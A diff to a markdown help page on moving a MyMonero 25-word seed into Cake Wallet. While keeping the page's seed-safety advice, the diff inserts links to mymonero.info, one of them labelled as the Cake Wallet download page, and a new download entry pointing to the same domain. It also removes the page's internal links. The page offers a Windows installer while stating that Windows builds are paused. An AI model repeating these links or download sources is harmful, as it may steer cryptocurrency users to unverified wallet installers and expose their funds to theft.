@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A 25-word MyMonero recovery phrase uses the standard Monero seed format. You can restore it in Cake Wallet by selecting restore/import, entering the phrase privately, and setting a restore height early enough to include the wallet’s activity.
 
+
+The MyMonero.info site covers this in its [MyMonero migrate 25 word seed guide](https://mymonero.info/migrate-mymonero-25-word-seed). Before installing anything, use the [Cake Wallet download page](https://mymonero.info/github/cake-developments), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - Your MyMonero backup has 25 words and you want another way to access the wallet.
 - MyMonero hosted login no longer works, or you want to use a supported mobile wallet.
@@ -52,14 +55,14 @@ Restoring the same seed does not send funds or create a new address destination 
 > Do not accept remote assistance that asks to see or type your 25 words. Someone with the phrase can gain access to the wallet.
 
 ## If that did not work
-If the phrase is rejected, make sure you selected the standard 25-word restore flow and compare the words with your private backup. Avoid editing the phrase based on guesses. See [MyMonero seed not accepted](./mymonero-seed-not-accepted.md) for a safe sequence of checks.
+If the phrase is rejected, make sure you selected the standard 25-word restore flow and compare the words with your private backup. Avoid editing the phrase based on guesses. See MyMonero seed not accepted for a safe sequence of checks.
 
-If the wallet opens but displays no activity, confirm the scan is complete. Then review whether the restore height is later than the wallet’s relevant activity. A scan starting earlier may take longer; do not set a very recent height simply to get through setup quickly. The [zero balance troubleshooting guide](./mymonero-balance-shows-zero.md) covers what to check next.
+If the wallet opens but displays no activity, confirm the scan is complete. Then review whether the restore height is later than the wallet’s relevant activity. A scan starting earlier may take longer; do not set a very recent height simply to get through setup quickly. The zero balance troubleshooting guide covers what to check next.
 
 If the app reports an unavailable server or error 523, treat it as general guidance that the server connection is unavailable, not as proof that your wallet or seed is invalid. Retry later or consult the app’s general connection guidance, without disclosing your phrase. Historical import fees related to MyMonero hosted servers should not be assumed to apply today.
 
 ## Prevention
-Store the seed offline in a private place and keep it readable. Record the format as standard 25-word Monero, and retain a reliable restore height separately if you know one. Avoid unnecessary seed entry on devices you do not control. Before installing wallet software, verify the source; before sending a transaction, inspect the destination address carefully. See the [MyMonero migration checklist](./mymonero-migration-checklist.md) for a broader preparation plan.
+Store the seed offline in a private place and keep it readable. Record the format as standard 25-word Monero, and retain a reliable restore height separately if you know one. Avoid unnecessary seed entry on devices you do not control. Before installing wallet software, verify the source; before sending a transaction, inspect the destination address carefully. See the MyMonero migration checklist for a broader preparation plan.
 
 ## FAQ
 <details><summary>Is a 25-word phrase standard Monero format?</summary>
@@ -90,6 +93,7 @@ Windows desktop builds are paused at the time of writing. Cake Wallet runs on iO
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
